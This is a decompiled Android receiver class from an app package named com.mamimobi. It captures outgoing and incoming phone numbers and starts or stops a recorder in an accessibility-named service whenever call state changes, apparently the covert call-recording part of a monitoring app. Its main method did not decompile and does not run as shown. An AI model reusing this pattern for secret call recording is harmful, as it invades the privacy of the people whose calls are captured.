package com.mamimobi.receiver;

import android.content.BroadcastReceiver;
import com.mamimobi.AccessService;
import java.text.DateFormat;
import java.util.Calendar;
import java.util.Date;

/* JADX INFO: loaded from: classes.dex */
public class CSReceiver extends BroadcastReceiver {
    public static String a = "";
    public static String b = "";
    public static boolean c = false;
    public static int d = 0;
    public static String e = "";

    public static void a(int i, String str) {
        b = DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
        int i2 = d;
        if (i2 != i) {
            if (i != 0) {
                if (i == 1) {
                    c = true;
                    if (str == null) {
                        str = "null";
                    }
                    e = str;
                } else if (i == 2) {
                    if (i2 != 1) {
                        c = false;
                        a = "OUT";
                        if (!AccessService.X) {
                            AccessService.G();
                        }
                    } else {
                        c = true;
                        a = "IN";
                        if (!AccessService.X) {
                            AccessService.G();
                        }
                    }
                }
            } else if (i2 != 1) {
                if (c) {
                    new Date();
                    if (AccessService.X) {
                        AccessService.X = false;
                        AccessService.Z.stop();
                        AccessService.Z.release();
                    }
                } else {
                    new Date();
                    if (AccessService.X) {
                        AccessService.X = false;
                        AccessService.Z.stop();
                        AccessService.Z.release();
                    }
                }
            }
            d = i;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:14:0x004f  */
    @Override // android.content.BroadcastReceiver
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void onReceive(android.content.Context r2, android.content.Intent r3) {
        /*
            r1 = this;
            java.lang.String r2 = r3.getAction()     // Catch: java.lang.Exception -> L53
            java.lang.String r0 = "android.intent.action.NEW_OUTGOING_CALL"
            boolean r2 = r2.equals(r0)     // Catch: java.lang.Exception -> L53
            if (r2 == 0) goto L1c
            android.os.Bundle r2 = r3.getExtras()     // Catch: java.lang.Exception -> L53
            java.util.Objects.requireNonNull(r2)     // Catch: java.lang.Exception -> L53
            java.lang.String r3 = "android.intent.extra.PHONE_NUMBER"
            java.lang.String r2 = r2.getString(r3)     // Catch: java.lang.Exception -> L53
            com.mamimobi.receiver.CSReceiver.e = r2     // Catch: java.lang.Exception -> L53
            return
        L1c:
            android.os.Bundle r2 = r3.getExtras()     // Catch: java.lang.Exception -> L53
            java.util.Objects.requireNonNull(r2)     // Catch: java.lang.Exception -> L53
            java.lang.String r0 = "state"
            java.lang.String r2 = r2.getString(r0)     // Catch: java.lang.Exception -> L53
            android.os.Bundle r3 = r3.getExtras()     // Catch: java.lang.Exception -> L53
            java.lang.String r0 = "incoming_number"
            java.lang.String r3 = r3.getString(r0)     // Catch: java.lang.Exception -> L53
            java.lang.String r0 = android.telephony.TelephonyManager.EXTRA_STATE_IDLE     // Catch: java.lang.Exception -> L53
            boolean r0 = r2.equals(r0)     // Catch: java.lang.Exception -> L53
            if (r0 != 0) goto L4f
            java.lang.String r0 = android.telephony.TelephonyManager.EXTRA_STATE_OFFHOOK     // Catch: java.lang.Exception -> L53
            boolean r0 = r2.equals(r0)     // Catch: java.lang.Exception -> L53
            if (r0 == 0) goto L45
            r2 = 2
            goto L50
        L45:
            java.lang.String r0 = android.telephony.TelephonyManager.EXTRA_STATE_RINGING     // Catch: java.lang.Exception -> L53
            boolean r2 = r2.equals(r0)     // Catch: java.lang.Exception -> L53
            if (r2 == 0) goto L4f
            r2 = 1
            goto L50
        L4f:
            r2 = 0
        L50:
            a(r2, r3)     // Catch: java.lang.Exception -> L53
        L53:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.mamimobi.receiver.CSReceiver.onReceive(android.content.Context, android.content.Intent):void");
    }
}
